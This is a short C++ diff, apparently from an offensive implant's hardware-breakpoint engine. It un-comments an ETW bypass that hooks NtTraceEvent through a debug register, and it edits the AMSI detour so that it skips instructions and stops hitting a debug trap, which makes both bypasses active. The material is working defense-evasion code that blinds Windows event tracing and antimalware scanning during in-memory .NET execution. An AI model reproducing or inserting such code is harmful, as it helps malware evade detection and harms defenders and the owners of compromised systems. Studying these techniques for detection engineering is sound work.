@@ -417,15 +417,15 @@ auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
 
     if ( this->DotnetBypass ) {
 
-        // if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
-        //     if ( !this->Etw.NtTraceEvent ) {
-        //         this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
-        //         KhDbg("NtTraceEvent %p", this->Etw.NtTraceEvent );
-        //     }
+        if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
+            if ( !this->Etw.NtTraceEvent ) {
+                this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
+                KhDbg("NtTraceEvent %p", this->Etw.NtTraceEvent );
+            }
 
-        //     Success = this->Install( this->Etw.NtTraceEvent, Dr1, (PVOID)this->EtwThunk, Self->Session.ThreadID );
-        //     if ( ! Success ) return Success;
-        // }
+            Success = this->Install( this->Etw.NtTraceEvent, Dr1, (PVOID)this->EtwThunk, Self->Session.ThreadID );
+            if ( ! Success ) return Success;
+        }
 
         if ( this->DotnetBypass == KH_BYPASS_AMSI || this->DotnetBypass == KH_BYPASS_ALL ) {
             if ( !this->Amsi.Handle ) {
@@ -460,8 +460,8 @@ auto DECLFN HwbpEng::EtwDetour(
 auto DECLFN HwbpEng::AmsiDetour(
     _In_ PCONTEXT Ctx
 ) -> VOID {
-    INT3BRK
     Ctx->Rdx  = (UPTR)Self->Krnl32.GetModuleHandleA;
+    Ctx->Rip += 5;
 }
 
 auto DECLFN HwbpEng::AmsiThunk(
